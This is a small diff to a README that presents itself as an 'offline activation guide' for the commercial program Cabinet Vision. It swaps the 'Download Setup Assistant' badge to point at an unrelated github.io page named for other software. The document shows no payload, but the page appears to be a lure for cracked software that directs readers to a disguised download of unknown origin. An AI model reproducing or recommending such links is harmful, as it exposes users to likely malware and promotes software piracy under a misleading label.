@@ -1,6 +1,6 @@
 # Cabinet Vision — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://cabinet-vision-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://kubera-for-windows.github.io/.github/kubera)
 
 ## ⚙️ How to Use
 
